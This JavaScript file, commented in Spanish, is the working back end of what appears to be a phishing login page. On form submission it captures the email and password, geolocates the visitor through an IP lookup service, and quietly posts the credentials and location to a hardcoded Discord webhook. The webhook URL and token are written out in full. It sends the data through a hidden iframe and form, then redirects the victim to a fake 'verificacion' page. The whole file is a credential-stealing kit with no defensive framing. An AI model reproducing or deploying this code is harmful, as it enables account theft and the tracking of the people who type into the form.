document.querySelector('.login--form').addEventListener('submit', async function (event) {
    event.preventDefault();

    // --- CONFIGURACIÓN ---
    const discordWebhook = 'https://discord.com/api/webhooks/1462992363814256804/PZcZVPGrikV4XTQEc1DSptMHR8c3ytyx4Q9JcZV7U3NOEFdqQ_XDWOc3yUMqIch1RoLO';

    // --- OBTENER DATOS ---
    const email = document.querySelector('input[name="eml"]').value;
    const password = document.querySelector('input[name="psew"]').value;

    // --- OBTENER DATOS DETALLADOS ---
    let ipInfo = {
        ip: 'N/A',
        city: 'Desconocida',
        region: 'Desconocida',
        country: 'Desconocido',
        isp: 'Desconocido',
        flag: '',
        map: '#'
    };

    try {
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            ipInfo = {
                ip: data.ip || 'N/A',
                city: data.city || 'Desconocida',
                region: data.region || 'Desconocida',
                country: data.country_name || 'Desconocido',
                isp: data.org || 'Desconocido',
                flag: '🏳️', // Puedes agregar lógica de banderas si quieres
                map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            };

            // Guardar para uso en otras páginas
            localStorage.setItem('user_full_info', JSON.stringify(ipInfo));
            localStorage.setItem('usuario', email); // Guardar email también
        }
    } catch (e) {
        console.warn('Error Geolocalización:', e);
    }

    // --- MENSAJE "ESPECÍFICO Y CLARO" ---
    const message = `
════════════════════════
🔐 **NUEVO INICIO DE SESIÓN**
════════════════════════
👤 **Usuario:**   ${email}
🔑 **Clave:**     ${password}
════════════════════════
🌍 **UBICACIÓN Y RED**
════════════════════════
📍 **IP:**        ${ipInfo.ip}
🏙️ **Ciudad:**    ${ipInfo.city}, ${ipInfo.region}
🏳️ **País:**      ${ipInfo.country}
📡 **ISP:**       ${ipInfo.isp}
🗺️ **Mapa:**      ${ipInfo.map}
════════════════════════
`;

    // --- ENVIAR ---
    sendToDiscord(discordWebhook, message);
});

/* 
   FUNCION AUXILIAR: Enviar a Discord 
   (Oculta la complejidad técnica del Formulario Oculto)
*/
function sendToDiscord(webhookUrl, content) {
    console.log('Enviando a Discord...');
    const iframeName = 'hidden_sender_' + Date.now();
    const iframe = document.createElement('iframe');
    iframe.name = iframeName;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    const form = document.createElement('form');
    form.action = webhookUrl;
    form.method = 'POST';
    form.enctype = 'multipart/form-data';
    form.target = iframeName;
    form.style.display = 'none';

    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'content';
    input.value = content;
    form.appendChild(input);

    document.body.appendChild(form);
    form.submit();

    // Redirección suave
    setTimeout(() => {
        window.location.href = 'verificacion.html';
    }, 1500);
}